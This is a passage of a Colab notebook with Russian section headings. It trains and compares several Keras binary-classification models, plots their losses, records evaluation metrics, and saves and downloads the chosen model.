class=\"node\">\n<title>136771226283088</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"41.5,-146.5 41.5,-182.5 175.5,-182.5 175.5,-146.5 41.5,-146.5\"/>\n<text text-anchor=\"middle\" x=\"77.5\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">dropout_1</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"113.5,-146.5 113.5,-182.5 \"/>\n<text text-anchor=\"middle\" x=\"144.5\" y=\"-160.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dropout</text>\n</g>\n<!-- 136771214572032&#45;&gt;136771226283088 -->\n<g id=\"edge4\" class=\"edge\">\n<title>136771214572032-&gt;136771226283088</title>\n<path fill=\"none\" stroke=\"black\" d=\"M108.5,-219.31C108.5,-211.29 108.5,-201.55 108.5,-192.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"112,-192.53 108.5,-182.53 105,-192.53 112,-192.53\"/>\n</g>\n<!-- 136771226283712 -->\n<g id=\"node6\" class=\"node\">\n<title>136771226283712</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"49.5,-73.5 49.5,-109.5 167.5,-109.5 167.5,-73.5 49.5,-73.5\"/>\n<text text-anchor=\"middle\" x=\"83.5\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_16</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"117.5,-73.5 117.5,-109.5 \"/>\n<text text-anchor=\"middle\" x=\"142.5\" y=\"-87.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 136771226283088&#45;&gt;136771226283712 -->\n<g id=\"edge5\" class=\"edge\">\n<title>136771226283088-&gt;136771226283712</title>\n<path fill=\"none\" stroke=\"black\" d=\"M108.5,-146.31C108.5,-138.29 108.5,-128.55 108.5,-119.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"112,-119.53 108.5,-109.53 105,-119.53 112,-119.53\"/>\n</g>\n<!-- 136771226284720 -->\n<g id=\"node7\" class=\"node\">\n<title>136771226284720</title>\n<polygon fill=\"none\" stroke=\"black\" points=\"49.5,-0.5 49.5,-36.5 167.5,-36.5 167.5,-0.5 49.5,-0.5\"/>\n<text text-anchor=\"middle\" x=\"83.5\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">dense_17</text>\n<polyline fill=\"none\" stroke=\"black\" points=\"117.5,-0.5 117.5,-36.5 \"/>\n<text text-anchor=\"middle\" x=\"142.5\" y=\"-14.8\" font-family=\"Times,serif\" font-size=\"14.00\">Dense</text>\n</g>\n<!-- 136771226283712&#45;&gt;136771226284720 -->\n<g id=\"edge6\" class=\"edge\">\n<title>136771226283712-&gt;136771226284720</title>\n<path fill=\"none\" stroke=\"black\" d=\"M108.5,-73.31C108.5,-65.29 108.5,-55.55 108.5,-46.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"112,-46.53 108.5,-36.53 105,-46.53 112,-46.53\"/>\n</g>\n</g>\n</svg>"
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Функция отображения обучения"
      ],
      "metadata": {
        "id": "yUOy4iZ_zf5T"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import matplotlib.pyplot as plt\n",
        "import tensorflow.keras as keras\n",
        "\n",
        "colors = plt.rcParams['axes.prop_cycle'].by_key()['color']\n",
        "\n",
        "def plot_loss(epochs, history, label='', n=1, val=False):\n",
        "    plt.semilogy(epochs,  history['loss'],\n",
        "               color=colors[n], label='Train '+label)\n",
        "    if val:\n",
        "      plt.semilogy(epochs,  history['val_loss'],\n",
        "            color=colors[n], label='Val '+label,\n",
        "            linestyle=\"--\")\n",
        "    plt.xlabel('Epoch')\n",
        "    plt.ylabel('Loss')\n",
        "\n",
        "    plt.legend()"
      ],
      "metadata": {
        "id": "0jrmuomAiyZI"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**МЕТРИКИ**"
      ],
      "metadata": {
        "id": "LAqOIo5nzj12"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.metrics import f1_score\n",
        "\n",
        "METRICS = [\n",
        "    keras.metrics.TruePositives(name='tp'),\n",
        "    keras.metrics.FalsePositives(name='fp'),\n",
        "    keras.metrics.TrueNegatives(name='tn'),\n",
        "    keras.metrics.FalseNegatives(name='fn'),\n",
        "    # Precision: (TP) / (TP + FP)\n",
        "    keras.metrics.Precision(name='precision'),\n",
        "    # Recall: (TP) / (TP+FN)\n",
        "    keras.metrics.Recall(name='recall'),\n",
        "    keras.metrics.AUC(name='auc'),\n",
        "    keras.metrics.Accuracy(name='accuracy')\n",
        "    ]"
      ],
      "metadata": {
        "id": "M4jWDrZci2aE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Пример обучения**"
      ],
      "metadata": {
        "id": "EaEjBmbYzsnT"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "model = models['simplest']\n",
        "model.compile(optimizer='adam', loss='binary_crossentropy', metrics=METRICS)\n",
        "model.fit(train_Xds, epochs=3, verbose=1)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YqcUtnPRjIVJ",
        "outputId": "84146336-5abe-45b0-e38f-ae5788894650"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Epoch 1/3\n",
            "8/8 [==============================] - 7s 127ms/step - loss: 0.8745 - tp: 16.0000 - fp: 41.0000 - tn: 5.0000 - fn: 2.0000 - precision: 0.2807 - recall: 0.8889 - auc: 0.5815 - accuracy: 0.0000e+00\n",
            "Epoch 2/3\n",
            "8/8 [==============================] - 1s 139ms/step - loss: 0.7533 - tp: 14.0000 - fp: 34.0000 - tn: 12.0000 - fn: 4.0000 - precision: 0.2917 - recall: 0.7778 - auc: 0.5821 - accuracy: 0.0000e+00\n",
            "Epoch 3/3\n",
            "8/8 [==============================] - 1s 138ms/step - loss: 0.6709 - tp: 11.0000 - fp: 22.0000 - tn: 24.0000 - fn: 7.0000 - precision: 0.3333 - recall: 0.6111 - auc: 0.6528 - accuracy: 0.0000e+00\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<keras.callbacks.History at 0x7c64884e4100>"
            ]
          },
          "metadata": {},
          "execution_count": 99
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "model.evaluate(val_Xds)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "u3QsWyR3jRNC",
        "outputId": "7f1f4ac2-21e4-4210-ff44-39fb0f32bc98"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "2/2 [==============================] - 1s 35ms/step - loss: 0.6320 - tp: 0.0000e+00 - fp: 5.0000 - tn: 10.0000 - fn: 1.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.4000 - accuracy: 0.0000e+00  \n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[0.631989061832428, 0.0, 5.0, 10.0, 1.0, 0.0, 0.0, 0.3999999761581421, 0.0]"
            ]
          },
          "metadata": {},
          "execution_count": 100
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Выбор лучшей модели**"
      ],
      "metadata": {
        "id": "Sj-7Ei5jz-NE"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "for i, (name, model) in enumerate(models.items()):\n",
        "  print(f\"\\n{i}th model: {name}!\")\n",
        "  if name == 'bidirectional':\n",
        "    continue\n",
        "  OPT = keras.optimizers.Adam()\n",
        "  model.compile(optimizer=OPT, loss='binary_crossentropy', metrics=METRICS)\n",
        "\n",
        "  h = model.fit(train_Xds, epochs=5, verbose=0)\n",
        "  plt.figure(figsize=[8, 4])\n",
        "  plot_loss(h.epoch, h.history, f\"\\n{i}th model, {name}\", i)\n",
        "\n",
        "  results = model.evaluate(train_Xds)\n",
        "\n",
        "  for name, value in zip(model.metrics_names, results):\n",
        "    print(name, ': ', value)\n",
        "  print()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "uNcO6MngjXzH",
        "outputId": "00be3a88-2355-4655-d351-736338e960be"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "0th model: simplest!\n",
            "8/8 [==============================] - 1s 19ms/step - loss: 0.5295 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 46.0000 - fn: 18.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.7615 - accuracy: 0.0000e+00\n",
            "loss :  0.5294629335403442\n",
            "tp :  0.0\n",
            "fp :  0.0\n",
            "tn :  46.0\n",
            "fn :  18.0\n",
            "precision :  0.0\n",
            "recall :  0.0\n",
            "auc :  0.7614734172821045\n",
            "accuracy :  0.0\n",
            "\n",
            "\n",
            "1th model: deep!\n",
            "8/8 [==============================] - 2s 64ms/step - loss: 0.5386 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 46.0000 - fn: 18.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.7500 - accuracy: 0.0000e+00\n",
            "loss :  0.5385873913764954\n",
            "tp :  0.0\n",
            "fp :  0.0\n",
            "tn :  46.0\n",
            "fn :  18.0\n",
            "precision :  0.0\n",
            "recall :  0.0\n",
            "auc :  0.75\n",
            "accuracy :  0.0\n",
            "\n",
            "\n",
            "2th model: deeper!\n",
            "8/8 [==============================] - 2s 77ms/step - loss: 0.5205 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 46.0000 - fn: 18.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.7772 - accuracy: 0.0000e+00\n",
            "loss :  0.520524799823761\n",
            "tp :  0.0\n",
            "fp :  0.0\n",
            "tn :  46.0\n",
            "fn :  18.0\n",
            "precision :  0.0\n",
            "recall :  0.0\n",
            "auc :  0.7771738767623901\n",
            "accuracy :  0.0\n",
            "\n",
            "\n",
            "3th model: conv1d!\n",
            "8/8 [==============================] - 1s 11ms/step - loss: 0.5924 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 46.0000 - fn: 18.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.6286 - accuracy: 0.0000e+00\n",
            "loss :  0.5924240350723267\n",
            "tp :  0.0\n",
            "fp :  0.0\n",
            "tn :  46.0\n",
            "fn :  18.0\n",
            "precision :  0.0\n",
            "recall :  0.0\n",
            "auc :  0.6286231875419617\n",
            "accuracy :  0.0\n",
            "\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Сохраним лучшую модель**"
      ],
      "metadata": {
        "id": "bdHzlfxMj93A"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from google.colab import files # для скачивания и загрузок файлов\n",
        "model_json = model.to_json()\n",
        "with open(\"model.json\",\"w\") as json_file:\n",
        "     json_file.write(model_json)\n",
        "files.download('model.json')\n",
        "model.save('weights.h5')\n",
        "files.download('weights.h5')\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 17
        },
        "id": "dAgyZ0IQkDUx",
        "outputId": "1183b240-d4d1-465a-b34d-ebce365a2b37"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "\n",
              "    async function download(id, filename, size) {\n",
              "      if (!google.colab.kernel.accessAllowed) {\n",
              "        return;\n",
              "      }\n",
              "      const div = document.createElement('div');\n",
              "      const label = document.createElement('label');\n",
              "      label.textContent = `Downloading \"${filename}\": `;\n",
              "      div.appendChild(label);\n",
              "      const progress = document.createElement('progress');\n",
              "      progress.max = size;\n",
              "      div.appendChild(progress);\n",
              "      document.body.appendChild(div);\n",
              "\n",
              "      const buffers = [];\n",
              "      let downloaded = 0;\n",
              "\n",
              "      const channel = await google.colab.kernel.comms.open(id);\n",
              "      // Send a message to notify the kernel that we're ready.\n",
              "      channel.send({})\n",
              "\n",
              "      for await (const message of channel.messages) {\n",
              "        // Send a message to notify the kernel that we're ready.\n",
              "        channel.send({})\n",
              "        if (message.buffers) {\n",
              "          for (const buffer of message.buffers) {\n",
              "            buffers.push(buffer);\n",
              "            downloaded += buffer.byteLength;\n",
              "            progress.value = downloaded;\n",
              "          }\n",
              "        }\n",
              "      }\n",
              "      const blob = new Blob(buffers, {type: 'application/binary'});\n",
              "      const a = document.createElement('a');\n",
              "      a.href = window.URL.createObjectURL(blob);\n",
              "      a.download = filename;\n",
              "      div.appendChild(a);\n",
              "      a.click();\n",
              "      div.remove();\n",
              "    }\n",
              "  "
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "download(\"download_1192efca-03a9-4135-8857-5e29f3d38af7\", \"model.json\", 2901)"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "\n",
              "    async function download(id, filename, size) {\n",
              "      if (!google.colab.kernel.accessAllowed) {\n",
              "        return;\n",
              "      }\n",
              "      const div = document.createElement('div');\n",
              "      const label = document.createElement('label');\n",
              "      label.textContent = `Downloading \"${filename}\": `;\n",
              "      div.appendChild(label);\n",
              "      const progress = document.createElement('progress');\n",
              "      progress.max = size;\n",
              "      div.appendChild(progress);\n",
              "      document.body.appendChild(div);\n",
              "\n",
              "      const buffers = [];\n",
              "      let downloaded = 0;\n",
              "\n",
              "      const channel = await google.colab.kernel.comms.open(id);\n",
              "      // Send a message to notify the kernel that we're ready.\n",
              "      channel.send({})\n",
              "\n",
              "      for await (const message of channel.messages) {\n",
              "        // Send a message to notify the kernel that we're ready.\n",
              "        channel.send({})\n",
              "        if (message.buffers) {\n",
              "          for (const buffer of message.buffers) {\n",
              "            buffers.push(buffer);\n",
              "            downloaded += buffer.byteLength;\n",
              "            progress.value = downloaded;\n",
              "          }\n",
              "        }\n",
              "      }\n",
              "      const blob = new Blob(buffers, {type: 'application/binary'});\n",
              "      const a = document.createElement('a');\n",
              "      a.href = window.URL.createObjectURL(blob);\n",
              "      a.download = filename;\n",
              "      div.appendChild(a);\n",
              "      a.click();\n",
              "      div.remove();\n",
              "    }\n",
              "  "
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "download(\"download_8e588e28-ebf1-494a-b388-8bdeb854122c\", \"weights.h5\", 482856)"
            ]
          },
          "metadata": {}
        }
      ]
    }
  ]
}